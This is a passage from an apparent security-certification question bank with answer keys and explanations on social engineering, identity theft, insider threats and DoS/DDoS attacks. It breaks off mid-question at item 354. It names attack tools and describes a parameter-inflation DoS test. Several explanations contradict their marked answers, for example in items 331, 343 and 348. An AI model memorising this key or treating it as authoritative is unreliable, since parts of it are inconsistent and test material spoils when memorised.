Research on target company → selecting target → develop the relationship → exploit the relationship.

316. In which phase of a social engineering attack does an attacker indulges in dumpster diving?
+ [x] Research on target
+ [ ] Selecting target
+ [ ] Develop the relationship
+ [ ] Exploit the relationship
> **Explanation:**
> **Phases of a Social Engineering Attack**
> Attackers take following steps to execute a successful social engineering attack:
> 
> + **Research on Target Company**
> Before attacking the target organization’s network, an attacker gathers sufficient information to infiltrate the system. Social engineering is one such technique that helps in extracting information. Initially, the attacker carries out research to collect basic information about the target organization such as the nature of the business, location, number of employees, and so on. While researching, the attacker indulges in dumpster diving, browsing the company’s website, finding employee details, and so on.
> 
> + **Selecting Target**
> After research, the attacker selects his target to extract sensitive information about the organization. Usually, attackers try to strike a chord with disgruntled employees because it is easier to manipulate them and extract information.
> 
> + **Develop the Relationship**
> Once the target is identified, the attacker builds a relationship with that employee to accomplish his/her task.
> 
> + **Exploit the Relationship**
> Next step is to exploit the relationship and extract sensitive information about the accounts, finance information, technologies in use, and upcoming plans.

317. John is a college dropout and spends most of his time on social networking sites looking for the people living in the city and gather their details. One day, he saw a girl's profile and found her email ID from her timeline. John sent her a mail stating that he possessed her private photos and if she fails to provide him with her bank account details, he will upload those images to social networking sites.  
What type of social engineering attack does John attempt on the girl?
+ [x] Spear Phishing
+ [ ] Whaling
+ [ ] Vishing
+ [ ] Pharming
> **Explanation:**
> **Vishing**
> Vishing (voice or VoIP phishing) is an impersonation technique in which attacker uses Voice over IP (VoIP) technology to trick individuals into revealing their critical financial and personal information and uses the information for his/her financial gain.
> 
> **Spear Phishing**
> Instead of sending thousands of emails, some attackers opt for “spear phishing” and use specialized social engineering content directed at a specific employee or small group of employees in a particular organization to steal sensitive data such as financial information and trade secrets.
> 
> **Whaling**
> Whaling attack is a type of phishing that targets high profile executives like CEO, CFO, politicians, and celebrities with complete access to confidential and highly valuable information.
> 
> **Pharming**
> Pharming is a social engineering technique in which the attacker executes malicious programs on a victim’s computer or server and when the victim enters any URL or domain name, it automatically redirects victim’s traffic to a website controlled by the attacker.


## Insider Threat, Identity Theft and Countermeasures
318. In which of the following identity thefts does an attacker acquire information from different victims to create a new identity?
+ [ ] Identity cloning and concealment
+ [ ] Social identity theft
+ [ ] Tax identity theft
+ [x] Synthetic identity theft
> **Explanation:**
> + **Tax Identity Theft:** This type of identity theft occurs when perpetrator steals the victim’s Social Security Number or SSN in order to file fraudulent tax returns and obtain fraudulent tax refunds. It creates difficulties for the victim in accessing the legitimate tax refunds and results in a loss of funds.
> + **Identity cloning and concealment:** This is a type of identity theft which encompasses all forms of identity theft where the perpetrators attempt to impersonate someone else in order to simply hide their identity. These perpetrators could be illegal immigrants or those hiding from creditors or simply want to become “anonymous” due to some other reasons.
> + **Synthetic identity theft:** This is one of the most sophisticated types of identity theft where the perpetrator obtains information from different victims to create a new identity. Firstly, he steals a Social Security Number or SSN and uses it with a combination of fake names, date of birth, address and other details required for creating new identity. The perpetrator uses this new identity to open new accounts, loans, credit cards, phones, other goods and services.
> + **Social identity theft:** This is another most common type of identity theft where the perpetrator steals victim’s Social Security Number or SSN in order to derive various benefits such as selling it to some undocumented person, use it to defraud the government by getting a new bank account, loans, credit cards or for passport.

319. Which of the following insider threat is caused due to the employee’s laxity toward security measures, policies, and practices?
+ [ ] a. Malicious insider
+ [ ] b. Professional insider
+ [x] c. Negligent insider
+ [ ] d. Compromised insider
> **Explanation:**
> **Type of Insider Threats**
> There are four types of insider threats. They are:
> + **Malicious Insider**
> Malicious insider threats come from disgruntled or terminated employees who steal data or destroy company networks intentionally by injecting malware into the corporate network.
> 
> + **Negligent Insider**
> Insiders, who are uneducated on potential security threats or simply bypass general security procedures to meet workplace efficiency, are more vulnerable to social engineering attacks. A large number of insider attacks result from employee’s laxity towards security measures, policies, and practices.
> 
> + **Professional Insider**
> Professional insiders are the most harmful insiders where they use their technical knowledge to identify weaknesses and vulnerabilities of the company’s network and sell the confidential information to the competitors or black market bidders.
> 
> + **Compromised Insider**
> An outsider compromises insiders having access to critical assets or computing devices of an organization. This type of threat is more difficult to detect since the outsider masquerades as a genuine insider.

320. Roy is a network administrator at an organization. He decided to establish security policies at different levels in the organization. He decided to restrict the installation of USB drives in the organization and decided to disable all the USB ports. Which of the following countermeasure Roy must employ?
+ [ ] Ensure a regular update of software
+ [ ] Use multiple layers of antivirus defenses
+ [ ] Adopt documented change management
+ [x] Implement proper access privileges
> **Explanation:**
> Some of the countermeasure against social engineering include:
> + Train Individuals on Security Policies: An efficient training program should consist of basic social engineering concepts and techniques, all security policies and methods to increase awareness about social engineering.
> + Implement Proper Access Privileges: There should be an administrator, user, and guest accounts with proper authorization.
> + Presence of Proper Incidence Response Time: There should be proper guidelines for reacting in case of a social engineering attempt.
> + Availability of Resources Only to Authorized Users: Make sure sensitive information is secured and resources are accessed only by authorized users
> + Scrutinize Information: Categorize the information as top secret, proprietary, for internal use only, for public use, etc.
> + Background Check and Proper Termination Process: Insiders with a criminal background and terminated employees are easy targets for procuring information.
> + Anti-Virus/Anti-Phishing Defenses: Use multiple layers of anti-virus defenses at end-user and mail gateway levels to minimize social engineering attacks.
> + Adopt Documented Change Management: A documented change-management process is more secure than the ad-hoc process.
> + Ensure a Regular Update of Software: Organization should ensure that the system and software are regularly patched and updated as the attackers exploit unpatched and out-of-date software in order to obtain useful information to launch an attack.
> + The administration need to implement proper access privileges in order to prevent users from accessing USB ports and devices.

321. Which of the following policies addresses the areas listed below:
+ Issue identification (ID) cards and uniforms, along with other access control measures to the employees of a particular organization.
+ Office security or personnel must escort visitors into visitor rooms or lounges.
+ Restrict access to certain areas of an organization in order to prevent unauthorized users from compromising security of sensitive data.
+ [ ] Special-access policies
+ [x] Physical security policies
+ [ ] Defense strategy
+ [ ] Password security policies
> **Explanation:**
> **Special-Access Policy:**
> + A special-access policy determines the terms and conditions of granting special access to system resources. It defines a set of rules to create, utilize, monitor, control, remove, and update those accounts with special access privileges, such as those of technical support staff and security administrators.
> 
> **Physical security policies address the following areas.**
> + Issue identification cards (ID cards), and uniforms, along with other access control measures to the employees of a particular organization.
> + Office security or personnel must escort visitors into visitor rooms or lounges.
> + Restrict access to certain areas of an organization in order to prevent unauthorized users from compromising security of sensitive data.
> + Old documents containing some valuable information must be disposed of by using equipment such as paper shredders and burn bins. This prevents information gathering by attackers using techniques such as dumpster diving.
> + Employ security personnel in an organization to protect people and property. Assist trained security personnel by alarm systems, surveillance cameras, etc.
> 
> **Password policies help in increasing password security and they state the following:**
> + Change passwords regularly.
> + Avoid passwords that are easy to guess. It is possible to guess passwords from answers to social engineering questions such as, “Where were you born?” “What is your favorite movie?” or "What is the name of your pet?"
> + Block user accounts if a user exceeds certain number of failed attempts to guess a password.
> + Choose lengthy (minimum of 6–8 characters) and complex (using various alphanumeric/special characters) passwords.
> + Do not disclose passwords to anyone.
> 
> **Defense Strategy**
> + Social Engineering Campaign - An organization should conduct numerous social engineering exercises using different techniques on a diverse group of people in order to examine how its employees would react to a real social engineering attacks.
> + Gap Analysis- From the information obtained from the social engineering campaign, evaluation of the organization is based on industry leading practices, emerging threats and mitigation strategies.
> + Remediation Strategies - Depending upon the result of the evaluation in gap analysis, a detailed remediation plan is developed that would mitigate the weaknesses or the loopholes found in earlier step. The plan focuses mainly on educating and creating awareness among employees based on their roles, identifying and mitigating potential threats to an organization.

322. Which of the following toolbars is used to provide an open application program interface (API) for developers and researchers to integrate anti-phishing data into their applications?
+ [ ] DroidSheep
+ [ ] Metasploit
+ [x] Netcraft
+ [ ] SET
> **Explanation:**
> **DroidSheep:** DroidSheep tool is a used for session hijacking on Android devices connected on common wireless network. It gets the session ID of active user on Wi-Fi network and uses it to access the website as an authorized user.
> 
> **SET:** The Social-Engineer Toolkit (SET) is an open-source Python-driven tool aimed at penetration testing via social engineering. It is a generic exploit designed to perform advanced attacks against human elements to compromise a target to offer sensitive information.
> 
> **Netcraft:** The Netcraft Toolbar provides updated information about the sites users visit regularly and blocks dangerous sites. The toolbar provides you with a wealth of information about the sites you visit. This information will help you make an informed choice about the integrity of those sites. It protects from phishing attacks and fraudsters.
> 
> **Metasploit:** The Metasploit Framework is a penetration-testing toolkit, exploit development platform, and research tool that includes hundreds of working remote exploits for a variety of platforms. It supports fully automated exploitation of web servers by abusing known vulnerabilities and leveraging weak passwords via Telnet, SSH, HTTP, and SNM.

323. Which of the following is an appropriate defense strategy to prevent attacks such as piggybacking and tailgating?
+ [ ] Employee training, best practices, and checklists for using passwords
+ [ ] Educate vendors about social engineering
+ [x] Implement strict badge, token or biometric authentication, employee training, and security guards
+ [ ] Train technical support executives and system administrators never to reveal passwords or other information by phone or email
> **Explanation:**
> **Common Social Engineering Targets and Defense Strategies:**
> The table below shows common social engineering targets, various social engineering techniques an attacker uses, and the defense strategies to counter these attacks.
> | **Social Engineering Targets** | **Attack Techniques** | **Defense Strategies** |
> |--|--|--|
> | Front office and help desk | Eavesdropping, shoulder surfing, impersonation, persuasion, and intimidation | Train employees/help desk never to reveal passwords or other information by phone. Enforce policies for the front office and help desk personnel |
> | Technical support and System administrators | Impersonation, persuasion, intimidation, fake SMS, phone calls, and emails | Train technical support executives and system administrators never to reveal passwords or other information by phone or email |
> | Perimeter security | Impersonation, reverse social engineering, piggybacking, tailgating, etc. | Implement strict badge, token or biometric authentication, employee training, and security guards |
> | Office | Shoulder surfing, eavesdropping, ingratiation, etc. | Employee training, best practices and checklists for using passwords. Escort all guests. |
> | Vendors of the target organization | Impersonation, persuasion, intimidation | Educate vendors about social engineering. |
> | Mail room | Theft, damage or forging of mails | Lock and monitor mail room, including employee training |
> | Machine room/Phone closet | Attempting to gain access, remove equipment, and/or attach a protocol analyzer to grab the confidential data | Keep phone closets, server rooms, etc. locked at all times and keep updated inventory on equipment |
> | Company’s Executives | Fake SMS, phone calls and emails to grab confidential data | Train executives to never reveal identity, passwords or other confidential information by phone or email |
> | Dumpsters | Dumpster diving | Keep all trash in secured, monitored areas, shred important data, erase magnetic media |

324. In which of the following attacks is the practice of spying on the user of a cash-dispensing machine or other electronic device performed in order to obtain their personal identification number, password, and so on?
+ [ ] Tailgating
+ [x] Shoulder surfing
+ [ ] Piggybacking
+ [ ] Dumpster diving
> **Explanation:**
> **Dumpster Diving:** Dumpster diving is the process of retrieving sensitive personal or organizational information by searching through trash bins.
> 
> **Piggybacking:** Piggybacking usually implies entry into the building or security area with the consent of the authorized person. For example, attackers would request an authorized person to unlock a security door, saying that they have forgotten their ID badge.
> 
> **Tailgating:** Tailgating implies access to a building or secured area without the consent of the authorized person. It is the act of following an authorized person through a secure entrance, as a polite user would open and hold the door for those following him. An attacker, wearing a fake badge, attempts to enter the secured area by closely following an authorized person through a door requiring key access. He/she then tries to enter the restricted area by pretending to be an authorized person.
> 
> **Shoulder Surfing:** Shoulder surfing is the technique of observing or looking over someone’s shoulder as he/she keys in information into a device. Attackers use shoulder surfing to find out passwords, personal identification numbers, account numbers, and other information.

325. Which of the following is a generic exploit designed to perform advanced attacks against human elements to compromise a target to offer sensitive information?
+ [x] Social-engineer toolkit (SET)
+ [ ] Cain and Abel
+ [ ] Wireshark
+ [ ] NetScanTools Pro
> **Explanation:**
> SET is an open-source Python-driven tool aimed at penetration testing via social engineering. It is a generic exploit designed to perform advanced attacks against human elements to compromise a target to offer sensitive information. SET categorizes attacks such as e-mail, web, and USB according to the attack vector used to trick humans. The toolkit attacks human weaknesses, exploiting trust, fear, avarice, and the helping nature of humans.

326. Which of the following threats is closely related to medical identity theft?
+ [ ] Synthetic identity theft
+ [x] Insurance identity theft
+ [ ] Social identity theft
+ [ ] Criminal identity theft
> **Explanation:**
> Insurance identity theft is a type of identity theft that is closely related to the medical identity theft. When performing an insurance identity theft, a perpetrator unlawfully takes the victim’s medical information to access his insurance for a medical treatment. Its effects include difficulties in settling medical bills, higher insurance premiums, and probably trouble in acquiring medical coverage later on.

327. Which of the following terms refers to an advanced form of phishing in which the attacker redirects the connection between the IP address and its target server?
+ [ ] Skimming
+ [ ] Hacking
+ [ ] Pretexting
+ [x] Pharming
> **Explanation:**
> Skimming refers to stealing credit/debit card numbers by using special storage devices called skimmers or wedges when processing the card. Pretexting is where fraudsters may pose as executives from financial institutions, telephone companies, and so on, who rely on “smooth talking” and win the trust of an individual to reveal sensitive information. Hacking is a technique where attackers may compromise user systems and route information using listening devices such as sniffers and scanners.

# 10. Denial-of-Service
## Overview of DoS/DDoS Attacks
328. What is the goal of a DDoS attack?
+ [ ] Exploit a weakness in the TCP stack
+ [ ] Create bugs in web applications
+ [ ] Capture files from a remote computer
+ [x] Render a network or computer incapable of providing normal service
> **Explanation:**
> In a DDoS attack, many applications overload the target browser or network with fake exterior requests that make the system, network, browser, or site slow, useless, disabled, or unavailable.

329. Which of the following statements is not true for a SYN flooding attack?
+ [ ] Attacker sends a TCP SYN request with a spoofed source address to the target server.
+ [x] Attacker sends an ACK response to the SYN/ACK from the target server.
+ [ ] In a SYN attack, the attacker exploits the three-way handshake method.
+ [ ] Tuning the TCP/IP stack will help reduce the impact of SYN attacks.
> **Explanation:**
> In a SYN attack, the attacker exploits the three-way handshake method. First, the attacker sends a fake TCP SYN request to the target server, and when the server sends back a SYN/ACK in response to the client (attacker) request, the client never sends an ACK response. This leaves the server waiting to complete the connection.

330. Bob is frustrated with his competitor, Brownies Inc., and he decides to launch an attack that would result in severe financial losses to his competitor. He plans and executes his attack carefully at an appropriate moment. Meanwhile, Trent, an administrator at Brownies Inc., realized that their primary financial transaction server had been attacked. As a result, one of their pieces of network hardware is rendered unusable, and he needs to replace or reinstall it to resume services. This process involves human interaction to fix it. What kind of DoS attack has been best illustrated in the aforementioned scenario?
+ [ ] Peer-to-Peer attack
+ [x] PDoS attack
+ [ ] Bandwidth attack
+ [ ] Application-level flood attack
> **Explanation:**
> PDoS attacks, also known as phlashing, purely target hardware. PDoS attack damages the system and makes its hardware unusable for its original purpose until the user replaces or reinstalls it. Unlike the DDoS attack, a PDoS attack exploits security flaws in a device, thereby allowing the remote administration on the management interfaces of the victim’s hardware, such as printers, routers, or other networking devices.
> 
> This attack is quicker and is more destructive than the traditional DoS attack. It works with a limited number of resources, unlike a DDoS attack, in which attackers enforce a set of zombies onto a target.

331. Which of the following is considered to be a smurf attack?
+ [ ] An attacker sends a large number of TCP/user datagram protocol (UDP) connection requests.
+ [ ] An attacker sends a large amount TCP traffic with a spoofed source IP address.
+ [x] An attacker sends a large amount of ICMP traffic with a spoofed source IP address.
+ [ ] An attacker sends a large number of TCP connection requests with spoofed source IP address.
> **Explanation:**
> In a smurf attack, the attacker sends a large number of ICMP request frames with a spoofed source IP address to the victim’s machine. Options (b), (c), and (d) are incorrect.

332. Which of the following techniques can be used to prevent a botnet attack?
+ [ ] Port scanning
+ [ ] Information gathering
+ [x] Black hole filtering
+ [ ] Physical security
> **Explanation:**
> Black hole filtering is used to discard packets at the routing level; especially suspicious malicious packets such as DDoS.Port scanning cannot prevent a botnet attack. Information gathering is part of footprinting and cannot prevent botnet attack. Physical security cannot prevent botnet attacks.

333. Systems administrator in a company named “We are Secure Ltd.” has encountered with a problem where he suspects the possibility of a cyber attack over his company’s router. He observed that vast amount of network traffic is directed toward the network router, causing router CPU utilization to reach 100% and making it non-functional to legitimate users. What kind of attack is this?
+ [ ] MitM attack
+ [ ] Buffer overflow (BoF) attack
+ [ ] SQL injection (SQLi) attack
+ [x] DoS attack
> **Explanation:**
> In a DoS attack, the CPU utilization becomes 100% making the router and the Internet connection unusable. It is not MitM—MitM could produce similar issue (Internet being slow or inaccessible), but it will not raise CPU level to 100%. It is not BoF—BoF could be used to produce this kind of a behavior, but the end result is DoS. It is not SQLi—SQLi cannot produce such a behavior.

334. A Company called “We are Secure Ltd.” has a router that has eight I/O ports, of which, the port one is connected to WAN and the other seven ports are connected to various internal networks. Network Administrator has observed a malicious DoS activity against the router through one of the eight networks. The DoS attack uses 100% CPU utilization and shuts down the Internet connection. The systems administrator tried to troubleshoot the router by disconnect ports one-by-one in order to identify the source network of the DoS attack. After disconnecting port number 6, the CPU utilization normalized and Internet connection resumes. With this information complete the system administrator came to a conclusion that the source of the attack was from _______________ network.
+ [ ] Wide Area Network (WAN)
+ [ ] Campus Area Network (CAN)
+ [x] Local Area network (LAN)
+ [ ] Metropolitan Area Network (MAN)
> **Explanation:**
> Since the Internet connection was on port 1 on the router, and all other ports were connected to LAN, the correct answer is LAN. All other options are clearly wrong because of this.

335. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the client’s computer is called a ___________
+ [ ] Botnet
+ [ ] Command and Control(C&C)
+ [ ] Client
+ [x] Bot
> **Explanation:**
> Answer is Bot. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the client’s computer is called a Bot. A botnet is a collection of Bots; C&C is a remote computer bots receive commands from and Client is not used in this terminology.

336. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the network created with infected computers is called ___________
+ [ ] Bot
+ [x] Botnet
+ [ ] Bot Area Network (BAN)
+ [ ] C&C
> **Explanation:**
> The answer is Botnet. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the network created with infected computers is called Botnet. Bot is a single computer in Botnet and C&C is a master server that instructs Bots what to do. BAN is a term that does not exist.

337. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the remote computer is called ___________
+ [ ] Bot
+ [ ] Botnet
+ [x] C&C
+ [ ] Server
> **Explanation:**
> Answer is C&C, which will instruct the Bot what to do. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the remote computer is called C&C. Bot and Botnet respectively represent infected computer and network of the infected computers managed by C&C and server is not used in this terminology.

338. Which of the following network attacks takes advantage of weaknesses in the fragment reassembly functionality of the transmission control protocol (TCP) or Internet protocol (IP) stack?
+ [ ] Ping of death attack
+ [ ] Smurf attack
+ [x] Teardrop attack
+ [ ] SYN flood attack
> **Explanation:**
> A teardrop attack is a denial-of-service (DoS) attack conducted by targeting TCP/IP fragmentation reassembly codes. This attack causes fragmented packets to overlap one another on the host receipt; the host then attempts to reconstruct the codes during the process but fails. Gigantic payloads are sent to the machine that is being targeted, causing the system to crash.

339. Bob is trying to access his friend Jason’s email account without his knowledge. He guesses and tries random passwords to log into the email account resulting in the lockdown of the email account for the next 24 hours. Now, if Jason tries to access his account even with his genuine password, he cannot access the email account for the next 24 hours. How can you categorize this DoS?
+ [ ] Bandwidth attack
+ [ ] Permanent Denial-of-Service (PDoS) attack
+ [x] Application-level attack
+ [ ] Peer-to-Peer attack
> **Explanation:**
> Application-level flood attacks result in the loss of services of a particular network resource. Examples include email, network resources, temporary ceasing of applications and services, and so on. By using this attack, attackers exploit weaknesses in programming source code to prevent the application from processing legitimate requests. In this type of attack, an attacker tries to exploit the vulnerabilities in application layer protocol or in the application itself to prevent the access of the application to the legitimate user.
> 
> Using application-level flood attacks, attackers attempt to:
> + Flood web applications to legitimate user traffic
> + Disrupt service to a specific system or person, for example, blocking a user’s access by repeating invalid login attempts
> + Jam the application database connection by crafting malicious SQL queries

340. Identify the DoS attack that does not use botnets for the attack. Instead, the attackers exploit flaws found in the network that uses the DC++ (direct connect) protocol, which allows the exchange of files between instant messaging clients.
+ [ ] Service request flood attack
+ [x] Peer-to-peer attack
+ [ ] Bandwidth attack
+ [ ] DRDoS attack
> **Explanation:**
> Peer-to-peer attack is a form of DDoS attack. In this kind of attack, the attacker exploits a number of bugs in peer-to-peer servers to initiate a DDoS attack. Unlike a botnet-based attack, a peer-to-peer attack eliminates the need for attackers to communicate with the clients it subverts. Here, the attacker instructs clients of large peer-to peer file-sharing hubs to disconnect from their peer-to-peer network and instead, to connect to the victim’s website. With this, several thousand computers may aggressively try to connect to a target website, which decreases the performance of the target website.

341. The DDoS tool created by anonymous sends junk HTTP GET and POST requests to flood the target, and its second version of the tool (the first version had different name) that was used in the so-called Operation Megaupload is called _______.
+ [x] HOIC
+ [ ] Pandora DDoS
+ [ ] Dereil
+ [ ] BanglaDOS
> **Explanation:**
> HOIC is the successor of low orbit ion cannon (LOIC) (which was used in operation payback by anonymous), and it is the version that has some additional features like hiding attacker’s geolocation.
> 
> BanglaDOS, Dereil, and Pandora DDoS do not have direct connection with anonymous group.

342. Jacob Hacker is a disgruntled employee and is fired from his position as a network engineer. He downloads a program outside the company that transmits a very small packet to his former company’s router, thus overloading the router and causing lengthy delays in operational service of his former company. He loads the program on a bunch of computers at several public libraries and executes them. What type of attack is this?
+ [ ] SSH Brute-Force attack
+ [ ] Man-in-the-middle attack
+ [ ] HTTP response-splitting attack
+ [x] DDoS attack
> **Explanation:**
> **DDoS attack:** DDoS is the right answer since Jacob has used multiple public libraries to overload his former company’s router. DDoS represents a flood attack.
> 
> **Man-in-the-middle attack:** When two parties are communicating, a man-in-middle attack can take place, in which a third party intercepts a communication between the two parties without their knowledge.
> 
> **HTTP Response-Splitting Attack:** An HTTP response-splitting attack is a web-based attack in which the attacker tricks the server by injecting new lines into response headers, along with arbitrary code. It involves adding header response data into the input field so that the server splits the response into two responses. This type of attack exploits vulnerabilities in input validation.
> 
> **SSH Brute Force Attack:** Attackers use the SSH protocols to create an encrypted SSH tunnel between two hosts in order to transfer unencrypted data over an insecure network. Usually SSH runs on TCP port 22. In order to conduct an attack on SSH, the attacker scans the entire SSH server using bots (performs TCP port 22 port scan) to identify possible vulnerabilities.

343. During the penetration testing of the MyBank public website, Marin discovered a credit/interest calculator running on server side, which calculates a credit return plan. The application accepts the following parameters:  
`amount=100000&duration=10&scale=month`
Assuming that parameter amount is the amount of credit, the user is calculating the interest and credit return plan (in this case for 100,000 USD), parameter duration is the timeframe the credit will be paid off, and scale defines how often the credit rate will be paid (year, month, day, …). How can Marin proceed with testing weather this web application is vulnerable to DoS?
+ [ ] Change the parameter duration to a small number and change scale value to “day” and resend the packet few times to observe the delay.
+ [ ] Leave the parameter duration as is and change the scale value to “year” and resend the packet few times to observe the delay.
+ [ ] Change the parameter duration to a small number and leave scale value on “month” and resend the packet few times to observe the delay.
+ [x] Change the parameter duration to a large number and change scale value to “day” and resend the packet few times to observe the delay.
> **Explanation:**
> The answer is (a) because then the application will have to calculate the credit return plan on a daily basis, which could be overwhelming for the CPU and/or database part of the web application (depending on how the web application is being developed). This could create a large delay between the attempts. If the packet is being resent many times, then this can create a DoS condition for as long as the packets are being resent. All the other answers are incorrect because having a smaller number in the duration parameter or a bigger duration scope will produce less calculation on server side.

344. Which of the following volumetric attacks technique transfers messages to the broadcast IP address in order to increase the traffic over a victim system and consuming his entire bandwidth?
+ [ ] Application layer attacks
+ [ ] Flood attack
+ [x] Amplification attack
+ [ ] Protocol attack
> **Explanation:**
> An amplification attack engages the attacker or zombies to transfer messages to a broadcast IP address. This method amplifies malicious traffic that consumes victim systems’ bandwidth.
> 
> A flood attack just involves zombies sending large volumes of traffic to victim’s systems in order to clog these systems’ bandwidth.
> 
> Protocol attacks and application layer attacks are not volumetric attacks.

345. Gordon was not happy with the product that he ordered from an online retailer. He tried to contact the seller’s post purchase service desk, but they denied any help in this matter. Therefore, Gordon wants to avenge this by damaging the retailer’s services. He uses a utility named high orbit ion cannon (HOIC) that he downloads from an underground site to flood the retailer’s system with requests so that the retailer’s site was unable to handle any further requests even from legitimate users’ purchase requests. What type of attack is Gordon using?
+ [ ] Gordon is executing commands or is viewing data outside the intended target path.
+ [ ] Gordon is taking advantage of an incorrect configuration that leads to access with higher-than-expected privilege.
+ [x] Gordon is using a denial-of-service attack.
+ [ ] Gordon is using poorly designed input validation routines to create and/or to alter commands so that he gains access to the secure data and execute commands.
> **Explanation:**
> DoS and distributed denial-of-service (DDoS) attacks have become a major threat to computer networks. These attacks attempt to make a machine or network resource unavailable to its authorized users.
> 
> In a DoS attack, an attacker overloads a system’s resources, thereby bringing the system down or at least significantly slowing the system’s performance. The goal of a DoS attack is not to gain unauthorized access to a system or to corrupt data; it is to keep away legitimate users from using the system.
> 
> HOIC is an open-source network stress testing and DoS attack application written in BASIC and designed to attack as many as 256 URLs at the same time.

346. In which of the following attacks does the attacker spoofs the source IP address with the victim’s IP address and sends large number of ICMP ECHO request packets to an IP broadcast network?
+ [ ] UDP flood attack
+ [x] Smurf attack
+ [ ] SYN flood attack
+ [ ] Ping of death attack
> **Explanation:**
> In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends large number of ICMP ECHO request packets to an IP broadcast network. This causes all the hosts on the broadcast network to respond to the received ICMP ECHO requests. These responses will be sent to the victim’s machine since the IP address is spoofed by the attacker. This causes significant traffic to the actual victim’s machine, ultimately leading the machine to crash.

347. Identify the DoS attack that does not use botnets for the attack. Instead, the attackers exploit flaws found in the network that uses the DC++ (direct connect) protocol, which allows the exchange of files between instant messaging clients.
+ [ ] Bandwidth attack
+ [ ] DRDoS attack
+ [x] Peer-to-peer attack
+ [ ] Service request flood attack
> **Explanation:**
> Peer-to-peer attack is a form of DDoS attack. In this kind of attack, the attacker exploits a number of bugs in peer-to-peer servers to initiate a DDoS attack. Unlike a botnet-based attack, a peer-to-peer attack eliminates the need for attackers to communicate with the clients it subverts. Here, the attacker instructs clients of large peer-to peer file-sharing hubs to disconnect from their peer-to-peer network and instead, to connect to the victim’s website. With this, several thousand computers may aggressively try to connect to a target website, which decreases the performance of the target website.


## DoS/DDoS Attack Techniques
348. Don Parker, a security analyst, is hired to perform a DoS test on a company. Which of the following tools can he successfully utilize to perform this task?
+ [ ] Cain and Abel
+ [x] Hping3
+ [ ] N-Stalker
+ [ ] Recon-ng
> **Explanation:**
> Hping3 is a command-line tool that can be used to send custom TCP/IP packets such as a huge number of SYN packets that can crash the target machine. Answers (b), (c), and (d) are wrong. Cain and Abel can be used as a password cracking tool; Recon-ng is an information gathering tool; and N-stalker is a webapp security scanner to search for vulnerabilities such as XSS and SQLi.

349. Paul has been contracted to test a network, and he intends to test for any DoS vulnerabilities of the network servers. Which of the following automated tools can be used to discover systems that are vulnerable to DoS?
+ [x] Nmap
+ [ ] John the ripper
+ [ ] Netcraft
+ [ ] Cain and Abel
> **Explanation:**
> Nmap is a security scanner for network exploration. It allows you to discover hosts and services on a computer network, thus creating a "map" of the network. It sends specially crafted packets to the target host and then analyzes the responses to accomplish its goal. Either a network administrator or an attacker can use this tool for their specific needs. Network administrators can use Nmap for network inventory, managing service upgrade schedules, and monitoring host or service uptime. In the process of network exploration and monitoring, Nmap can be used to test for DoS vulnerabilities.
> 
> John the ripper is a password cracking tool, whereas Cain and Abel can be used to perform password cracking. Netcraft is used for information gathering.

350. A systems administrator in a small company named “We are Secure Ltd.” has a problem with their Internet connection. The following are the symptoms: the speed of the Internet connection is slow (so slow that it is unusable). The router connecting the company to the Internet is accessible and it is showing a large amount of SYN packets flowing from one single IP address. The company’s Internet speed is only 5 Mbps, which is usually enough during normal working hours. What type of attack is this?
+ [ ] DDoS
+ [ ] MitM
+ [ ] DRDoS
+ [x] DoS
> **Explanation:**
> Since the attack is coming from one single IP address, it is not a DDoS because all requests come from the same IP and it is not a DRDoS because of the SYN packets – in reflection attacks other type of packets will be used (answer that reflection device is sending to an initial request). It is not MitM – MitM does not have anything to do with DoS (at least not directly).

351. A systems administrator in a small company named “We are Secure Ltd.” has a problem with their Internet connection. The following are the symptoms: The speed of the Internet connection is slow (so slow that it is unusable). The router connecting the company to the Internet is accessible and it is showing large amount of router solicitation messages from neighboring routers even though the router is not supposed to receive any of these messages. What type of attack is this?
+ [ ] DDoS (Distributed Denial of Service)
+ [x] DRDoS (Distributed Reflected Denial of Service)
+ [ ] MitM (Man in the Middle)
+ [ ] DoS (Denial of Service)
> **Explanation:**
> The answer is DRDoS. A distributed reflection denial-of-service attack (DRDoS), also known as a “spoofed” attack, involves the use of multiple intermediary and secondary machines that contribute to the actual DDoS attack against the target machine or application. The DRDoS attack exploits the TCP three-way handshake vulnerability. This attack involves attacker machine, intermediary victims (zombies), secondary victims (reflectors), and the target machine. Attacker launches this attack by sending requests to the intermediary hosts, which in turn reflects the attack traffic to the target. It is not DoS or DDoS because the attack is being reflected. It is not MitM—MitM does not have anything to do with DoS (at least not directly).

352. Martha is a network administrator in a company named “Dubrovnik Walls Ltd.” She realizes that her network is under a DDoS attack. After careful analysis, she realizes that large amounts of UDP packets are being sent to the organizational servers that are present behind the “Internet facing firewall.”
What type of DDoS attack is this?
+ [ ] Protocol attack
+ [x] Volume (volumetric) attack
+ [ ] Application layer attack
+ [ ] SYN flood attack
> **Explanation:**
> The answer is volume-based attack which includes UDP floods, ICMP floods, and other spoofed packet floods. It is not protocol attack, which includes SYN floods, fragmented packet attacks, ping of death attack, smurfDDoS, teardrop attack, land attack, and so on. It is not application layer attack, which includes GET/POST floods, attacks that targets web server, application or OS vulnerabilities, Slowloris, and so on. It is not SYN flood since this is part of protocol attacks.

353. Martha is a network administrator in a company named “Dubrovnik Walls Ltd.”. She realizes that her network is under a DDoS attack. After careful analysis, she realizes that a large amount of fragmented packets are being sent to the servers present behind the “Internet facing firewall.”
What type of DDoS attack is this?
+ [x] Protocol attack
+ [ ] Volume (volumetric) attack
+ [ ] SYN flood attack
+ [ ] Application layer attack
> **Explanation:**
> The answer is protocol attack, which includes SYN floods, fragmented packet attacks, ping of death attack, smurf DDoS, teardrop attack, land attack, and so on. It is not volume-based attack, which includes UDP floods, ICMP floods, and other spoofed-packet floods. It is not application layer attack, which includes GET/POST floods, attacks that targets web server, application or OS vulnerabilities, Slowloris, and so on. It is not SYN flood attack since SYN flooding is a part of the protocol attack.

354. Martha is a network administrator in company named “Dubrovnik Walls Ltd.” She realizes that her network is under a DDoS attack. After careful analysis, she realizes that large amount of HTTP POST requests are being sent to the web servers behind the WAF. The traffic is not legitimate, since the web application requires workflow to be finished in order to send the data with the POST request, and this workflow data is missing. So, What type of DDoS attack is this?
+ [ ] SYN flood attack
+ [ ] Volume (volumetric) attack
